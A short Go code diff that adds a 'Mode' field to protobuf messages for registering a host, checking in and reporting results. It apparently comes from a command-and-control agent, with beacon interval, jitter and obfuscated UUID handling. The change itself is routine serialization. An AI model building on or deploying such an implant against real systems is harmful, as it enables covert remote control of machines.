@@ -15,6 +15,7 @@ func genRegister(interval int, delta int, regFile string, obfText string) []byte
 		Interval: int32(interval),
 		Delta:    int32(delta),
 		Hostname: hostname,
+		Mode:     "register",
 	}
 	data, _ := proto.Marshal(pro)
 	return data
@@ -29,6 +30,7 @@ func genCheckin(regFile string, obfText string) []byte {
 	uuid := fetchUUID(regFile, obfText)
 	pro := &mcs.MCS{
 		Uuid: uuid,
+		Mode: "checkin",
 	}
 	data, _ := proto.Marshal(pro)
 	return data
@@ -43,6 +45,7 @@ func addResult(uuid string, result string) []byte {
 	pro := &mcs.MCS{
 		Uuid:   uuid,
 		Result: result,
+		Mode:   "addResult",
 	}
 	data, _ := proto.Marshal(pro)
 	return data
